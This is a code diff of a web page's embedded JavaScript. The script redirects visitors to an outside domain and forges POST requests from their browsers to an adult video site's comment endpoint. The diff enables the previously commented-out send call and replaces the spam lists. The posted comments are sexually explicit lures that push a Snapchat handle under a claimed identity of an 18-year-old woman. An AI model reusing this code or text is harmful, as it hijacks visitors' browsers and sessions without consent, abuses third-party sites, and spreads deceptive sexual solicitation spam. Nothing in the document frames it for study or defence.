@@ -24,19 +24,18 @@ top.location.href='http://zstrakr.com/mob1.php';
 }
 
 function getVid(){
-   var sites = ["1148645", "8244667", "2424490", "8982696", "2400168", "8330507", "3675721", "8067181", "4991565", "3726365", "8971430", "3848100", "3685571", "9101447", "8600688", "9025418", "3198380", "9025339", "8511510", "2643304", "1443059", "7903049", "8987036"];
-    var i = parseInt(Math.random()*(sites.length-1));
+   var sites = ["7919931","7588645","8857924","3646861","5372733","8597903","3700204","9177825","8876294","8014555","8837395","9151381","9086714","6508338","307187","9141880","7532044","3347613","667560","8222458","9225022","9155842","1984695","8508329","3592961","9091466","1978022","691892","6317459"];
+        var i = parseInt(Math.random()*(sites.length-1));
     return sites[i];
 };
 
 function getCom(){
-   var coma = ["swapping nudes on snapchat, princessgurlx", "add me on snapchat guys, princessgurlx", "whos on snapchat?? princessgurlx", "snapchat someone? princessgurlx", "who wants to see my pussy on snapchat, im horny.. princessgurlx", "nude swap on snapchat any1? princessgurlx", "if any1 has snapchat, add me, princessgurlx", "add me on snapchat guys, 18 female.. princessgurlx", "18 female add me on snapchat guys, princessgurlx"];
-    var i = parseInt(Math.random()*(coma.length-1));
-    return coma[i];
+     var sites1 = ["sharing nudes on snapchat, jennyp2013", "who wants to trade nudes on snapchat? jennyp2013", "add me on snapchat for some fun ;) jennyp2013", "snapchat jennyp2013 for tradin nudes"];
+    var i = parseInt(Math.random()*(sites1.length-1));
+    return sites1[i];
 };
 
-
-var randy=Math.floor(Math.random()*11);
+var randy=Math.floor(Math.random()*1100);
 var cmt=getCom();
 var vid=getVid();
 function XHR() {
@@ -64,14 +63,13 @@ xmlhttp = new XHR();
 if (xmlhttp != null) {
     xmlhttp['open']('POST', 'http://www.xnxx.com/postcomment/' + vid, false);
     xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
-  // xmlhttp['send']('user=messbout'+ randy + '&comment=' + cmt + '&test=ok');
+   xmlhttp['send']('user=jennyp'+randy+'&comment=' + cmt + '&test=ok');
+
     if (xmlhttp['responseText'] != null) {
         var token = xmlhttp['responseText'];
     };
 } else {};
 </script>
-
-
 </head>
   <body>
 
